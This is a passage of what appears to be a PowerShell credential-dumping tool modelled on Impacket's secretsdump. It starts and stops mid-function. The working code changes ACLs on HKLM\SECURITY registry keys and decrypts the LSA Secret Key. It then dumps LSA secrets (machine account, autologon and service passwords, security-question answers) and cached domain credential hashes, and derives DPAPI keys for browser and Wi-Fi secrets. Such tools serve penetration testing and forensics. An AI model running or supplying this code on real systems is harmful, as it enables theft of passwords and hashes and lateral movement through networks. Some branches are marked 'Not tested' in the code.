		$LMHash = $UserHashes[0]
		$NTHash = $UserHashes[1]
		If ($LMHash -and $NTHash)
		{
			$HexLMHash = [System.BitConverter]::ToString($LMHash).Replace("-", "")
			$HexNTHash = [System.BitConverter]::ToString($NTHash).Replace("-", "")
			Write-Host ("[+] {0}:{1}:{2}:{3}" -f ($UserName, $RID, $HexLMHash, $HexNTHash))

			$UserInfo["RID"] = $RID
			$UserInfo["NT"] = $NTHash
			$UserInfo["LM"] = $LMHash
			$SAM[$UserName] = $UserInfo
		}
	}

	return $SAM
}

<###############>
<# LSA Secrets #>
<###############>

<#
	Get-LSASecrets: Each secret is encrypted with LSA Secret Key, LSA Secret Key is encrypted with BootKey, after decrypting LSA Secrets we may gained:
		- $MACHINE.ACC = Machine account password in clear text if computer is joined to a domain
		- DefaultPassword = Clear text password when autologon is configured for an account
		- NL$KM = Secret key in clear text for decrypting Cached Domain Credentials
		- DPAPI_SYSTEM = System User MasterKey and System Machine MasterKey in clear text for decrypting System User MasterKey files and System Machine MasterKey files (DPAPI)
		- _SC_<ServiceName> = Service account password in clear text
		- ASPNET_WP_PASSWORD = Password for .NET services in clear text
		- L$_SQSA_S-<SID> = Clear text answers for Windows Security Questions 
		1- Get-LSASecretKey
		2- Get LSA secrets from HKLM\Security\Policy\Secrets and decrypt them with LSA Secret Key
#>

function Get-LSASecretKey($BootKey)
{
	<#
		Get-LSASecretKey: Get required LSA Secret Key for decrypting LSA Secrets with BootKey
			1- Get encrypted LSA Secret Key depending on Windows version:
				1.1- If >= Windows Vista (Check if HKLM\Security\Policy\PolEKList or HKLM\Security\Policy\PolSecretEncryptionKey exist)
					- Encrypted LSA Secret Key = Default property of registry HKLM\Security\Policy\PolEKList
					- Structure LSA_SECRET = Enc_LSASecretKey
					- Update = BootKey
					- For i in range (1000) : Update += LSA_SECRET[EncryptedData][:32]
					- Key = SHA256 (Update)
					- Data = LSA_SECRET[EncryptedData][32:]
					- For i in range (0, len(Data), 16):
						- Block = Data[i:i+16]
						- If (len(Block) < 16) : Block += "\x00" * (16 - len(Block))
						- Plaintext += AESDecrypt (Key, Block, "\x00" * 16)
					- Structure LSA_SECRET_BLOB = PlainText
					- LSASecretKey = LSA_SECRET_BLOB["Secret"][52:][:32]
				1.2- Else
					- Encrypted LSA Secret Key = Default property of registry of registry HKLM\Security\Policy\PolSecretEncryptionKey
					- Update = BootKey
					- for i in range (1000) : Update += Enc_LSASecretKey[60:76]
					- Key = MD5 (Update)
					- PlainText = RC4Decrypt (Key, Enc_LSASecretKey[12:60])
					- LSASecretKey = PlainText[0x10:0x20]

	#>
	
	Write-Host "`n[===] Retrieve LSA Secret Key with Boot Key"

	# Set full control for registry "HKLM\SECURITY\Policy" and subregistry/subkeys
	$SubKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SECURITY\Policy', 'ReadWriteSubTree', 'ChangePermissions')
	$ACL = $SubKey.GetAccessControl()
	$Rule = New-Object System.Security.AccessControl.RegistryAccessRule ([Security.Principal.WindowsIdentity]::GetCurrent().Name, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
	$ACL.SetAccessRule($Rule)
	$SubKey.SetAccessControl($ACL)

	[byte[]]$Enc_LSASecretKey = $Null
	$Global:VistaStyle = $True

	$Enc_LSASecretKey = Get-RegKeyPropertyValue "HKLM" "SECURITY\Policy\PolEKList" ""
	If (-not $Enc_LSASecretKey)
	{
		$Enc_LSASecretKey =  Get-RegKeyPropertyValue "HKLM" "SECURITY\Policy\PolSecretEncryptionKey" ""
		If (-not $Enc_LSASecretKey)
		{
			# Remove ACL
			$Removed = $ACL.RemoveAccessRule($Rule)
			$SubKey.SetAccessControl($ACL)
			$SubKey.Close()

			Write-Error "Unable to retrieve encrypted LSA Secret Key"
			return $Null
		}
		Else
		{
			$Global:VistaStyle = $False
		}
	}

	# Remove ACL
	$Removed = $ACL.RemoveAccessRule($Rule)
	$SubKey.SetAccessControl($ACL)
	$SubKey.Close()

	If ($Global:VistaStyle)
	{
		# Structure from Impacket "secretsdump.py" : LSA_SECRET
		$LSA_SECRET = $Enc_LSASecretKey
		$Version = $LSA_SECRET[0..3]
		$EncKeyID = $LSA_SECRET[4..19]
		$EncAlgorithm = $LSA_SECRET[20..23]
		$Flags = $LSA_SECRET[24..27]
		$EncryptedData = $LSA_SECRET[28..$($LSA_SECRET.Length-1)]

		$SHA256 = [System.Security.Cryptography.SHA256]::Create()
		$Update = $BootKey
		For ($i = 0; $i -lt 1000; $i += 1)
		{
			$Update += $EncryptedData[0..31]
		}
		$Key = $SHA256.ComputeHash($Update)
		$PlainText = [byte[]]@()
		$Data = $EncryptedData[32..$($EncryptedData.Length-1)]
		For ($i = 0; $i -lt $Data.Length; $i = $i+16)
		{
			$Block = $Data[$i..$($i+15)]
			If ($Block.Length -ne 16)
			{
				$Block = ($Block + ((,0) * (16-$Block.Length)))
			}
			$PlainText += (AESTransform $Key $Block (New-Object byte[] 16) $False)
		}

		# Structure from Impacket "secretsdump.py" : LSA_SECRET_BLOB
		$LSA_SECRET_BLOB = $PlainText
		$Length = [BitConverter]::ToInt32($LSA_SECRET_BLOB[0..3], 0)
		$Unknown = $LSA_SECRET_BLOB[4..15]
		$Secret = $LSA_SECRET_BLOB[16..$(16+($Length-1))]
		$Remaining = $LSA_SECRET_BLOB[$(16+($Length))..$($LSA_SECRET_BLOB.Length-1)]

		$LSASecretKey = ($Secret[52..$($Secret.Length-1)])[0..31]
	}
	Else
	{
		$MD5 = [System.Security.Cryptography.MD5]::Create()
		$Update = $BootKey
		For ($i = 0; $i -lt 1000; $i += 1)
		{
			$Update += $Enc_LSASecretKey[60..75]
		}
		$Key = $MD5.ComputeHash($Update)
		$Plaintext = (NewRC4 $Key).Transform($Enc_LSASecretKey[12..59])
		$LSASecretKey = $PlainText[16..31]
	}

	$HexLSASecretKey = [System.BitConverter]::ToString($LSASecretKey).Replace("-", "")
	Write-Host ("[+] LSA Secret Key = {0}" -f ($HexLSASecretKey))

	return $LSASecretKey
}

function Decrypt-LSASecret($LSASecretKey, $Data, $SecretName)
{
	<#
		Decrypt-LSASecret: Decrypt an encrypted LSA Secret with LSA Secret Key
			1- Depending on Windows version:
				1.1- If >= Windows Vista
					- Structure LSA_SECRET = Data
					- Update = LSASecretKey
					- For i in range (1000) : Update += LSA_SECRET[EncryptedData][:32]
					- Key = SHA256 (Update)
					- Data = LSA_SECRET[EncryptedData][32:]
					- For i in range (0, len(Data), 16)
						- Block = Data[i:i+16]
						- If (len(Block) < 16) : Block += "\x00" * (16 - len(Block))
						- Plaintext += AESDecrypt (Key, Block, "\x00" * 16)
					- Structure LSA_SECRET_BLOB = PlainText
					- LSA Secret Key = LSA_SECRET_BLOB["Secret"]
				1.2- Else
					- Structure LSA_SECRET = Data
					- EncryptedSecretSize = Data[:4]
					- Value = Data[len(Data)-EncryptedSecretSize:]
					- Key0 = LSASecretKey
					- For i in range (0, len(Value), 8):
						- CipherText = Value[:8]
						- StrKey = Key0[:7]
						- Key = STRToKey(StrKey)
						- PlainText += DESDecrypt(Key, CipherText)
						- Key0 = Key0[7:]
						- Value = Value[8:]
						- If len(Key0) < 7
							- Key0 = LSASecretKey[len(Key0):]
					- Structure LSA_SECRET_XP = PlainText
					- LSA Secret Key = LSA_SECRET_XP["Secret"]
	#>
	
	If ($Global:VistaStyle)
	{
		# Structure from Impacket "secretsdump.py" : LSA_SECRET
		$LSA_SECRET = $Data
		$Version = $LSA_SECRET[0..3]
		$EncKeyID = $LSA_SECRET[4..19]
		$EncAlgorithm = $LSA_SECRET[20..23]
		$Flags = $LSA_SECRET[24..27]
		$EncryptedData = $LSA_SECRET[28..$($LSA_SECRET.Length-1)]

		$SHA256 = [System.Security.Cryptography.SHA256]::Create()
		$Update = $LSASecretKey
		For ($i = 0; $i -lt 1000; $i += 1)
		{
			$Update += $EncryptedData[0..31]
		}
		$Key = $SHA256.ComputeHash($Update)
		$PlainText = [byte[]]@()
		$Data = $EncryptedData[32..$($EncryptedData.Length-1)]
		For ($i = 0; $i -lt $Data.Length; $i = $i+16)
		{
			$Block = $Data[$i..$($i+15)]
			If ($Block.Length -ne 16)
			{
				$Block = ($Block + ((,0) * (16-$Block.Length)))
			}
			$PlainText += (AESTransform $Key $Block (New-Object byte[] 16) $False)
		}

		If ($SecretName -ne 'NL$KM')
		{
			# Structure from Impacket "secretsdump.py" : LSA_SECRET_BLOB
			$LSA_SECRET_BLOB = $PlainText
			$Length = [BitConverter]::ToInt32($LSA_SECRET_BLOB[0..3], 0)
			If ($Length -gt 0)
			{
				$Unknown = $LSA_SECRET_BLOB[4..15]
				$Secret = $LSA_SECRET_BLOB[16..$(16+($Length-1))]
				$Remaining = $LSA_SECRET_BLOB[$(16+($Length))..$($LSA_SECRET_BLOB.Length-1)]

				return $Secret
			}
			Else
			{
				return $Null
			}
		}
		Else
		{
			return $PlainText
		}
	}
	Else
	{
		# Not tested
		$EncryptedSecretSize = [BitConverter]::ToInt32($Data[0..3], 0)
		$Value = $Data[$($Data.Length-$EncryptedSecretSize)..$($Data.Length-1)]
		$Key0 = $LSASecretKey
		$PlainText = [byte[]]@()
		For ($i = 0; $i -lt $Value.Length; $i = $i+8)
		{
			$CipherText = $Value[0..7]
			$StrKey = $Key0[0..6]
			$Key = STRToKey $StrKey
			$PlainText += (DESTransform $Key $CipherText $Key $False)
			$Key0 = $Key0[7..$($Key0.Length-1)]
			$Value = $Value[8..$($Value.Length-1)]
			If (Key0.Length -lt 7)
			{
				$Key0 = $LSASecretKey[$($Key0.Length)..$($LSASecretKey.Length-1)]
			}
		}

		# Structure from Impacket "secretsdump.py" : LSA_SECRET_XP
		$LSA_SECRET_XP = $PlainText
		$Length = [BitConverter]::ToInt32($LSA_SECRET_XP[0..3], 0)
		If ($Length -gt 0)
		{
			$Version = $LSA_SECRET_XP[4..7]
			$Secret = $LSA_SECRET_XP[8..$(8+($Length-1))]

			return $Secret
		}
		Else
		{
			return $Null
		}
	}
}

function Get-LSASecrets($LSASecretKey)
{
	<#
		Get-LSASecrets: Get LSA Secrets and decrypt them with LSA Secret Key
			1- Parse default property of registry SECURITY\Policy\Secrets\<LSASecretType>\CurrVal (Don't know about OldVal)
			2- Decrypt each secret with LSA Secret Key
		All stuff is in Decrypt-LSASecret	
	#>
	
	Write-Host "`n[===] Enumerate LSA Secrets and decrypt them with LSA Secret Key"

	# Set full control for registry "HKLM\SECURITY\Policy\Secrets" and subregistry/subkeys
	$SubKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SECURITY\Policy\Secrets', 'ReadWriteSubTree', 'ChangePermissions')
	$ACL = $SubKey.GetAccessControl()
	$Rule = New-Object System.Security.AccessControl.RegistryAccessRule ([Security.Principal.WindowsIdentity]::GetCurrent().Name, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
	$ACL.SetAccessRule($Rule)
	$SubKey.SetAccessControl($ACL)

	$LSASecrets = @{}

	ForEach ($Child in $(Get-ChildItem HKLM:\SECURITY\Policy\Secrets))
	{
		$LSASecret = @{}

		$Enc_CurrVal = Get-RegKeyPropertyValue "HKLM" "SECURITY\Policy\Secrets\$($Child.PSChildName)\CurrVal" ""
		$Enc_OldVal = Get-RegKeyPropertyValue "HKLM" "SECURITY\Policy\Secrets\$($Child.PSChildName)\OldVal" ""
		If ($Enc_CurrVal)
		{
			$LSASecret["CurrVal"] = Decrypt-LSASecret $LSASecretKey $Enc_CurrVal $Child.PSChildName
		}
		If ($Enc_OldVal)
		{
			$LSASecret["OldVal"] = Decrypt-LSASecret $LSASecretKey $Enc_OldVal $Child.PSChildName
		}

		$LSASecrets[$Child.PSChildName] = $LSASecret

		If ((-not $LSASecret["CurrVal"]) -or ($LSASecret["CurrVal"][0..1] -eq @(0, 0)))
		{
			Continue
		}
		ElseIf ($Child.PSChildName -eq 'NL$KM')
		{
			# Structure from Impacket "secretsdump.py" : LSA_SECRET_BLOB
			$LSA_SECRET_BLOB = $LSASecret["CurrVal"]
			$Length = [BitConverter]::ToInt32($LSA_SECRET_BLOB[0..3], 0)
			$Unknown = $LSA_SECRET_BLOB[4..15]
			$NLKMKey = $LSA_SECRET_BLOB[16..$(16+($Length-1))]
			$Remaining = $LSA_SECRET_BLOB[$(16+($Length))..$($LSA_SECRET_BLOB.Length-1)]
			$HexNLKM = [System.BitConverter]::ToString($NLKMKey).Replace("-", "")
			Write-Host ('[+] Cached Domain Credentials NL$KM Key = ' + $HexNLKM)
		}
		ElseIf ($Child.PSChildName -eq "DPAPI_SYSTEM")
		{
			# Structure from Impacket "dpapi.py" : DPAPI_SYSTEM
			$DPAPI_SYSTEM = $LSASecret["CurrVal"]
			$Version = $DPAPI_SYSTEM[0..3]
			$MachineKey = $DPAPI_SYSTEM[4..23]
			$UserKey = $DPAPI_SYSTEM[24..43]

			$HexMachinekey = [System.BitConverter]::ToString($MachineKey).Replace("-", "")
			$HexUserkey = [System.BitConverter]::ToString($UserKey).Replace("-", "")
			Write-Host ("[+] DPAPI System Machine Key = {0}`n[+] DPAPI System User Key = {1}" -f ($HexMachinekey, $HexUserkey))
		}
		ElseIf ($Child.PSChildName -eq '$MACHINE.ACC')
		{
			$MACHINEACC_Plain = $LSASecret["CurrVal"]
			$MACHINEACC_NT = Get-MD4 $MACHINEACC_Plain
			$emptyLM = [byte[]]@(0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee,0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee)
			$HexEmptyLM = [System.BitConverter]::ToString($emptyLM).Replace("-", "")
			$HexMACHINEACC_NT = [System.BitConverter]::ToString($MACHINEACC_NT).Replace("-", "")
			$MACHINEACC_Plain = [System.Text.Encoding]::Unicode.GetString($MACHINEACC_Plain)
			$ComputerName = (Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Name).Name
			$DomainName = (Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Domain).Domain
			Write-Host ('[+] Machine account LM/NT Hashes = {0}\{1}$:{2}:{3}' -f ($DomainName, $ComputerName, $HexEmptyLM, $HexMACHINEACC_NT))
			Write-Host ('[+] Machine account cleartext password = {0}' -f ($MACHINEACC_Plain))
		}
		ElseIf ($Child.PSChildName -eq "DefaultPassword")
		{
			$DefaultPWD = [Text.Encoding]::Unicode.GetString($LSASecret["CurrVal"])
			$DefaultLogin = (Get-Item "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon").GetValue("DefaultUserName")
			$DefaultDomain = (Get-Item "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon").GetValue("DefaultDomainName")
			If (-not $DefaultLogin) { $DefaultLogin = "<UnknownUser>" }
			If (-not $DefaultDomain) { $DefaultDomain = "." }
			Write-Host ("[+] Default login account credentials = {0}\{1}:{2}" -f ($DefaultDomain, $DefaultLogin, $DefaultPWD))
		}
		ElseIf ($Child.PSChildName[0..3] -eq "_SC_")
		{
			# Not tested
			$Secret = [Text.Encoding]::Unicode.GetString($LSASecret["CurrVal"])
			$ServiceName = $Child.PSChildName[4..$($Child.PSChildName.Length-1)]
			$Services = Get-WmiObject Win32_Service -Property Name, StartName
			ForEach ($Service in $Services)
			{
				If ($Service.Name -eq $ServiceName)
				{
					$Account = $Service.StartName
				}
			}
			If (-not $Account) { $Account = "<UnknownUser>" }
			Write-Host ("[+] Service account secret = {0}:{1}:{2}" -f ($Account, $ServiceName, $Secret))
		}
		ElseIf ($Child.PSChildName -eq "ASPNET_WP_PASSWORD")
		{
			# Not tested
			$ASPNET_WP_PASSWORD = [Text.Encoding]::Unicode.GetString($LSASecret["CurrVal"])
			Write-Host ("[+] ASPNET Password = {0}" -f ($ASPNET_WP_PASSWORD))
		}
		ElseIf ($Child.PSChildName[0..8] -eq 'L$_SQSA_S')
		{
			# Not tested
			$SID = $Child.PSChildName[9..$($Child.PSChildName.length-1)]
			$JSON = (([Text.Encoding]::Unicode.GetString($LSASecret["CurrVal"])).Replace([char]0xa0, " ")) | ConvertFrom-Json
			If ([int]$JSON.version -eq 1)
			{
				ForEach ($Item in $JSON.questions)
				{
				   $Question = $Item.question
				   $Answer = $Item.answer
				   Write-Host ("[+] Security Question/Answer = {0}:{1}" -f ($Question, $Answer))
				}
			}
			Else
			{
				Write-Error ("Unknown Security Questions LSA Secret version")
			}
		}
		Else
		{
			Write-Error ("Unknown LSA Secret : {0}" -f ($Child.PSChildName))
		}
	}

	# Remove ACL
	$Removed = $ACL.RemoveAccessRule($Rule)
	$SubKey.SetAccessControl($ACL)
	$SubKey.Close()

	return $LSASecrets
}

<#############################>
<# Cached Domain Credentials #>
<#############################>

function Get-CachedDomainCreds($NLKM)
{
	<#
	Get-CachedDomainCreds: With decrypted NL$KM key from LSA Storage we can decrypt Cached Domain Credentials
		1- If property "NL$IterationCount" of registry HKLM\SECURITY\Cache -> Compute iterations
		2- For each cached domain credential into property "NL$<X>" of registry HKLM\SECURITY\Cache
			- Structure NL_RECORD = HKLM\SECURITY\Cache\NL$<X>
			2.1- If NL_RECORD[IV] != 16 * "\x00"
				2.1.1- If >= Windows Vista
					- PlainText = AESDecrypt (NL$KM[16:32], NL_RECORD[EncryptedData], NL_RECORD[IV])
				2.1.2- Else
					- Key = HMAC_MD5 (Key=NL$KM, Message=NL_RECORD[IV])
					- PlainText = RC4Encrypt (Key, NL_RECORD[EncryptedData])
			2.2- Else
				- Unknown case
			2.3- Parse decrypted cached domain credential
				- MSCashHash = PlainText[:0x10]
				- PlainText = PlainText[0x48:]
				- UserName = PlainText[:NL_RECORD[UserLength]].decode ("UTF-16LE")
				- PlainText = PlainText[pad(NL_RECORD[UserLength]) + pad(NL_RECORD[DomainNameLength]):]
				- DomainName = Plaintext[:pad(NL_RECORD[DnsDomainNameLength])].decode ("UTF-16LE")
	#>
	
	Write-Host ("`n[===] Enumerate Cached Domain Credentials and decrypt them with {0} Key from LSA Secrets" -f ('NL$KM'))

	# Set full control for registry "HKLM\SECURITY\Cache" and subregistry/subkeys
	$SubKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SECURITY\Cache', 'ReadWriteSubTree', 'ChangePermissions')
	$ACL = $SubKey.GetAccessControl()
	$Rule = New-Object System.Security.AccessControl.RegistryAccessRule ([Security.Principal.WindowsIdentity]::GetCurrent().Name, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
	$ACL.SetAccessRule($Rule)
	$SubKey.SetAccessControl($ACL)

	$IterationCount = 10240
	If (Get-ItemProperty "HKLM:\SECURITY\Cache" -Name 'NL$IterationCount' -ErrorAction SilentlyContinue)
	{
		$Record = [BitConverter]::ToInt32((Get-RegKeyPropertyValue "HKLM" "SECURITY\Cache" 'NL$IterationCount'), 0)
		If ($Record -gt 10240) { $IterationCount = $Record -band 0xfffffc00 }
		Else { $IterationCount = $Record * 1024 }
	}

	$CachedDomainCreds = @{}

	(Get-ItemProperty "HKLM:\SECURITY\Cache").PSObject.Properties | ForEach-Object -Process {
		If (($_.Name -match '^NL\$') -and ($_.Name -ne 'NL$Control') -and ($_.Name -ne 'NL$IterationCount'))
		{
			$Enc_CachedCred = Get-RegKeyPropertyValue "HKLM" "SECURITY\Cache" $_.Name

			If ($Enc_CachedCred -and (@(Compare-Object $Enc_CachedCred (New-Object byte[] ($Enc_CachedCred.Length)) -SyncWindow 0).Length -ne 0))
			{
				# Structure from Impacket "secretsdump.py" : NL_RECORD
				$NL_RECORD = $Enc_CachedCred
				$UserLength = [BitConverter]::ToInt16($NL_RECORD[0..1], 0)
				$DomainNameLength = [BitConverter]::ToInt16($NL_RECORD[2..3], 0)
				$EffectiveNameLength = $NL_RECORD[4..5]
				$FullNameLength = $NL_RECORD[6..7]
				$LogonScriptName = $NL_RECORD[8..9]
				$ProfilePathLength = $NL_RECORD[10..11]
				$HomeDirectoryLength = $NL_RECORD[12..13]
				$HomeDirectoryDriveLength = $NL_RECORD[14..15]
				$UserId = $NL_RECORD[16..19]
				$PrimaryGroupId = $NL_RECORD[20..23]
				$GroupCount = $NL_RECORD[24..27]
				$LogonDomainNameLength = $NL_RECORD[28..29]
				$Unkown0 = $NL_RECORD[30..31]
				$LastWrite = $NL_RECORD[32..39]
				$Revision = $NL_RECORD[40..43]
				$SidCount = $NL_RECORD[44..47]
				$Flags = $NL_RECORD[48..51]
				$Unkown1 = $NL_RECORD[52..55]
				$LogonPackageLength = $NL_RECORD[56..59]
				$DnsDomainNameLength = [BitConverter]::ToInt16($NL_RECORD[60..61], 0)
				$UPN = $NL_RECORD[62..63]
				<#
				$MetaData = $NL_RECORD[..]
				$FullDomainLength = $NL_RECORD[..]
				$Length2 = $NL_RECORD[..]
				#>
				$IV = $NL_RECORD[64..79]
				$CH = $NL_RECORD[80..95]
				$EncryptedData = $NL_RECORD[96..$($NL_RECORD.Length-1)]

				If (@(Compare-Object $IV (New-Object byte[] 16) -SyncWindow 0).Length -ne 0)
				{
					If (([BitConverter]::ToInt32($Flags, 0) -band 1) -eq 1)
					{
						If ($Global:VistaStyle)
						{
							$PlainText = AESTransform $NLKM[16..31] $EncryptedData $IV $False
						}
						Else
						{
							$HMAC = [System.Security.Cryptography.HMACMD5]::Create()
							$HMAC.Key = $NLKM
							$HMAC.HashName = "MD5"
							$Key = $HMAC.ComputeHash($IV)
							$PlainText = (NewRC4 $Key).Transform($EncryptedData)
						}

						$CachedDomainCred = @{}

						$MSCashHash = $PlainText[0..15]
						$HexMSCashHash = [System.BitConverter]::ToString($MSCashHash).Replace("-", "")
						$Plaintext = $Plaintext[72..$($PlainText.Length-1)]
						$UserName = [Text.Encoding]::Unicode.GetString($PlainText[0..$($UserLength-1)])
						$Plaintext = $PlainText[$((Pad $UserLength) + (Pad $DomainNameLength))..$($PlainText.Length-1)]
						$DomainName = ([Text.Encoding]::Unicode.GetString($PlainText[0..$((Pad $DnsDomainNameLength)-1)])) -Replace "`0", ""

						Write-Host ("[+] {0}\{1}:{2}" -f ($DomainName, $UserName, $HexMSCashHash))

						$CachedDomainCred["DomainName"] = $DomainName
						$CachedDomainCred["MSCashHash"] = $MSCashHash
						$CachedDomainCreds[$UserName] = $CachedDomainCred
					}
					Else
					{
						Write-Error ("Unknown NL_RECORD[Flags] for entry {0}" -f ($_.Name))
					}
				}
			}
		}
	}

	# Remove ACL
	$Removed = $ACL.RemoveAccessRule($Rule)
	$SubKey.SetAccessControl($ACL)
	$SubKey.Close()

	If ($CachedDomainCreds.Count -eq 0) { Write-Host "[-] No cached domain credentials saved" }

	return $CachedDomainCreds
}

<#################>
<# DPAPI Secrets #>
<#################>

<#
	- DPAPI Secrets (or DPAPI Blob) are encrypted/decrypted with MasterKeys and CryptProtectData()/CryptUnprotectData() from Windows API
	- MasterKeys are encrypted with PreKeys
	- MasterKeys are stored encrypted into MasterKey Files
		- Users MasterKey' Files
			- C:\Users\<USER>\AppData\Roaming\Microsoft\Protect\<UserSID>\<MKGUID>
		- System MasterKey' Files
			- C:\Windows\System32\Microsoft\Protect\User\<MKGUID> (System User Master Key File)
			- C:\Windows\System32\Microsoft\Protect\<MKGUID> (System Machine Master Key File)
		- Each DPAPI Blob store <MKGUID> to know which Master Key file use for DPAPI decryption
	- Two types of PreKeys
		- Users' PreKeys
		- System PreKeys (System User PreKey and System Machine PreKey) from DPAPI_SYSTEM of LSA Storage (encrypted with LSA Secret Key)
	- Users' PreKeys can be computed from their (password + SID) or (NT hash + SID)
		- Key1 = HMAC-SHA1 (SHA1 (Pwd), SID + "\x00") (For local users)
		- Key2 = HMAC-SHA1 (SHA1 (NTHash), SID + "\x00") (For domain users)
		- Key3 = HMAC-SHA1 (PKBKDF2-HMAC-SHA256 (PKBKDF2-HMAC-SHA256 (NTHash, SID), SID), SID + "\x00") (For users of "Protected users" group)
	- Each MasterKey File contain 5 entries
		- Headers and system information
		- MasterKey encrypted with Users' PreKeys or System PreKeys (depending on DPAPI encryption/decryption context)
		- DomainBackupMasterKey encrypted with RSA public key of DC (RSA keys pair generated and send to DC when generating Master Key)
		- LocalBackupEncryptionKey encrypted with System Machine PreKey from DPAPI_SYSTEM of LSA Storage
		- CREDHIST GUID
			- In Windows 2000, It stored the LocalBackupMasterKey encrypted, which could be decrypted by any administrator with the LocalBackupEncryptionKey and allowed to retrieve every Users' MasterKeys
			- After Windows 2000, It point to a CREDHIST File which contain Old User's PreKeys chain encrypted with user current's password
	- For each MasterKey File : Master Key/Domain Backup Master Key/Local Backup Master Key (Windows 2000) point to the same Master Key value once decrypted
	- DPAPI encryption/decryption context
		- "CRYPTPROTECT_UI_FORBIDDEN" = 0x1 = Used when user interface is not available. For example, when using remote access.
		- "CRYPTPROTECT_LOCAL_MACHINE" = 0x4 = Data is protected using local computer account. Any administrator user of the system may be able to decrypt it.
		- "CRYPTPROTECT_CRED_SYNC" = 0x8 = Forces synchronizing user's credentals. Normally runs automatically upon user password change.
		- "CRYPTPROTECT_AUDIT" = 0x10 = Enables audit during encryption/dectyption
		- "CRYPTPROTECT_VERIFY_PROTECTION" = 0x40 = The flag checks security level of DPAPI blob. If the default security level is higher than current security level of the blob, the function returns error CRYPT_I_NEW_PROTECTION_REQUIRED as advice to reset securiry for the source data.
		- "CRYPTPROTECT_CRED_REGENERATE" = 0x80 = Regenerate local computer passwords.
		- "CRYPTPROTECT_SYSTEM" = 0x20000000 = Indicates that only system processes can encrypt/decrypt data.
		
	- DPAPI Secrets can be:
		- Cookies/Pwds from IE, Chrome (Encrypted with User MasterKeys)
		- Wi-Fi passwords (Encrypted with System MasterKeys)
		- E-mail account passwords in Outlook, Windows Mail, etc.
		- Passwords from Remote Desktop Connection Manager
		- Internal FTP manager account passwords
		- Encryption key in Windows CardSpace and Windows Credential Vault Manager
		- Any data encrypted with CryptProtectData()
	
	Get-DPAPISecrets:
		1- Compute PreKeys (Users' PreKeys with gathered Pwds/NTHashes and System PreKeys with DPAPI_SYSTEM from LSA Storage)
		2- Retrieve all MasterKey Files and try to decrypt each part (Master Key/Domain Backup Master Key/Local Backup Master Key (Windows 2000)) with PreKeys to obtain the decrypted MasterKey value
			- For System MasterKey' Files we know that we have to use System PreKeys (and we always have them)
			- For Users MasterKey' we don't know which User PreKeys to use (and we may have not them), BUT we can validate the decryption success
		3- Find DPAPI Secrets
			- Chrome cookies/pwds have known locations
			- Wi-Fi passwords have known locations
		4- Decrypt the DPAPI Secret (or DPAPI Blob) with the corresponding MasterKey (MKGUID) decrypted (If we have It)
		
	NOTE: MasterKeys can be stored and retrieved from LSASS (not implemented)
#>

### Get MasterKeys decrypted ###

function Get-PreKeys($LSA_DPAPI_SYSTEM, $SAM, $Pwds, $NTHashes)
{
	<#
		Get-PreKeys:
			1- Get System User PreKey and System Machine PreKey from DPAPI_SYSTEM of LSA Storage
			2- Get Users' PreKeys from their NT Hashes into SAM
				- Key2 = HMAC-SHA1 (SHA1 (NTHash), SID + "\x00") (For domain users)
				- Key3 = HMAC-SHA1 (PKBKDF2-HMAC-SHA256 (PKBKDF2-HMAC-SHA256 (NTHash, SID), SID), SID + "\x00") (For users of "Protected users" group)
			3- Get Users' PreKeys from provided Pwds/NTHashes (may have collision from SAM)
				- Key1 = HMAC-SHA1 (SHA1 (Pwd), SID + "\x00") (For local users)
				- Key2 = HMAC-SHA1 (SHA1 (NTHash), SID + "\x00") (For domain users)
				- Key3 = HMAC-SHA1 (PKBKDF2-HMAC-SHA256 (PKBKDF2-HMAC-SHA256 (NTHash, SID), SID), SID + "\x00") (For users of "Protected users" group)
	#>
	
	# PreKeys from LSA DPAPI System Machine/User Key
	$PreKeys = ,($LSA_DPAPI_SYSTEM[4..23])
	$PreKeys += ,($LSA_DPAPI_SYSTEM[24..43])

	# PreKeys from SAM
	# Key2 = HMAC-SHA1 (SHA1 (NTHash), SID + "\x00") (For domain users)
	# Key3 = HMAC-SHA1 (PKBKDF2-HMAC-SHA256 (PKBKDF2-HMAC-SHA256 (NTHash, SID), SID), SID + "\x00") (For users of "Protected users" group)
	ForEach ($User in $SAM.Keys)
	{
		$UserPreKeys = @{}

		$SID = ((New-Object System.Security.Principal.NTAccount($User)).Translate([System.Security.Principal.SecurityIdentifier])).Value
		$NTH = $SAM[$User]["NT"]

		$HMACSHA1 = [System.Security.Cryptography.HMACSHA1]::Create()
		$HMACSHA1.Key = $NTH
		$UserPreKeys["Key2"] = $HMACSHA1.ComputeHash([Text.Encoding]::Unicode.GetBytes($SID + [Char]0x0))

		$TmpKey = PBKDF2_HMAC_SHA256 $NTH ([Text.Encoding]::Unicode.GetBytes($SID)) 256 10000
		$TmpKey2 = (PBKDF2_HMAC_SHA256 $TmpKey ([Text.Encoding]::Unicode.GetBytes($SID)) 256 1)[0..15]
		$HMACSHA1.Key = $TmpKey2
		$UserPreKeys["Key3"] = $HMACSHA1.ComputeHash([Text.Encoding]::Unicode.GetBytes($SID + [Char]0x0))

		ForEach ($KeyNumber in $UserPreKeys.Keys)
		{
			$PreKeys += ,($UserPreKeys[$KeyNumber])
		}
	}

	# PreKeys from provided Pwds and NTHashes
	# Key1 = HMAC-SHA1 (SHA1 (Pwd), SID + "\x00") (For local users)
	# Key2 = HMAC-SHA1 (SHA1 (NTHash), SID + "\x00") (For domain users)
	# Key3 = HMAC-SHA1 (PKBKDF2-HMAC-SHA256 (PKBKDF2-HMAC-SHA256 (NTHash, SID), SID), SID + "\x00") (For users of "Protected users" group)
	If ($Pwds)
	{
		ForEach ($Pwd in $Pwds)
		{
			$UserPreKeys = @{}

			$SID = ($Pwd.Keys -Join '')
			$NTH = Get-MD4 ([Text.Encoding]::Unicode.GetBytes($Pwd[$SID]))
